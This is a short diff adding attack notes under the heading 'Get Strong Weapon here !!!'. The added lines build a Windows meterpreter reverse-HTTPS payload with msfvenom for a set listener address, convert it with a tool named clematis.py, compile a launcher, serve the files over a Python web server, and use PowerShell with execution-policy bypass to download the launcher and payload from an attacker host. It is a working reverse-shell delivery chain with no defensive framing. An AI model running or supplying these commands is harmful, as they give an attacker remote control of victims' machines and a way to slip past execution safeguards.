@@ -1,1 +1,8 @@
 Get Strong Weapon here !!!
+Only for host 192.168.23.101:443
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.23.101 LPORT=443 -f exe -o 443.exe
+python3 clematis.py -f 443.exe -o 443.exe.bin
+x86_64-w64-mingw32-gcc -o launcher.exe launcher.c --static
+sudo python3 -m http.server 80
+powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.88.128/launcher.exe', 'launcher.exe')"
+powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.88.128/443.exe.bin', '443.exe.bin')"
